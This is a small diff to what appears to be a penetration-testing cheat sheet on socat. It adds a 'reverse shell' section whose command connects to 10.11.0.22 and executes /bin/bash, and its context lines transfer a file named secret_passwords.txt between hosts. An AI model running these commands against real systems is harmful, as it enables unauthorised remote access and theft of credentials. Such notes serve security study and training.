@@ -40,3 +40,9 @@ socat - TCP4:ip-address:80
 sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
 socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 ```
+
+### Socat reverse shell
+```
+socat -d -d TCP4-LISTEN:443 STDOUT
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
